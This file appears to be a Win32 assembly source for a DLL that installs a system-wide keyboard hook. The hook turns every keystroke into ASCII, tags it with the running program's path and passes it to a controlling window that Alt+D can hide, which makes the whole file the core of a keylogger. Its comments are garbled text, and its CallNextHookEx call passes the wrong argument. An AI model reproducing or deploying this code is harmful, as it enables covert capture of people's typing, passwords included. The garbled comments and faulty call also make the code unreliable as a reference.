
	.386
	.model flat, stdcall
	option casemap :none
;-------------------------------------------------------------------------------------------------------
; Include �ļ�����
include		windows.inc
include		user32.inc
includelib	user32.lib
include		kernel32.inc
includelib	kernel32.lib
;--------------------------------------------------------------------------------------------------------
;equ����
IDM_HIDE    equ    2001h
;-------------------------------------------------------------------------------------------------------
;���ݶ�
	.data
hInstance    dd    ?

	.data?
hWnd         dd    ?
hHook        dd    ?
dwMessage    dd    ?
szAscii      db    4 dup (?)
current_app_name  db    200 DUP (?)
;-------------------------------------------------------------------------------------------------------
;�����
	.code
; dll ����ں���
DllEntry  proc  _hInstance,_dwReason,_dwReserved
	push _hInstance
	pop  hInstance
	mov  eax,TRUE
	ret
DllEntry  endp
;dll �Ļص�����
HookProc  proc  dwCode,wParam,lParam
	local  @szKeyState[256]:byte
	.if (dwCode == HC_ACTION) && (wParam != 0) ;ȷ�����������·�ֹ��λ�ȡ����asciiֵ
		invoke  GetKeyboardState,addr @szKeyState;��ȡ����״̬��������
		invoke  GetKeyState,VK_SHIFT
		mov  @szKeyState + VK_SHIFT,al
		mov  ecx,lParam
		shr  ecx,16
		invoke  ToAscii,wParam,ecx,addr @szKeyState,addr szAscii,0;ת��Ϊascii��
		.if eax!=0 ;ת���ɹ�,�������ǿգ�����ascii��
			mov byte ptr szAscii [eax],0
			invoke GetModuleHandle,NULL
			invoke GetModuleFileName, eax , addr current_app_name, 200 ;��ȡ��ǰ���ڽ�������ĳ����ȫ·��
			invoke  SendMessage,hWnd,dwMessage,dword ptr szAscii,eax;����ascii��
			mov ecx,lParam
			shr ecx,29
			.if (ecx&1)&&(wParam==44h);������alt+dʱ������Ϣ���л���ʾ/����״̬
				invoke  SendMessage,hWnd,WM_COMMAND,IDM_HIDE,NULL
			.endif
			xor eax,eax
		.endif
	.endif
	invoke	CallNextHookEx,hHook,dwCode,dwCode,lParam
	ret
HookProc	endp
; ���Ӱ�װ����
InstallHook  proc  _hWnd,_dwMessage
	push  _hWnd
	pop   hWnd
	push  _dwMessage
	pop  dwMessage
	invoke   SetWindowsHookEx,WH_KEYBOARD,addr HookProc,hInstance,NULL;��װȫ�ּ��̹���
	mov  hHook,eax
	.if eax!=NULL
		mov eax,offset current_app_name
	.endif
	ret
InstallHook  endp
; ����ж�غ���
UninstallHook  proc
	invoke  UnhookWindowsHookEx,hHook
	ret
UninstallHook  endp
end	DllEntry

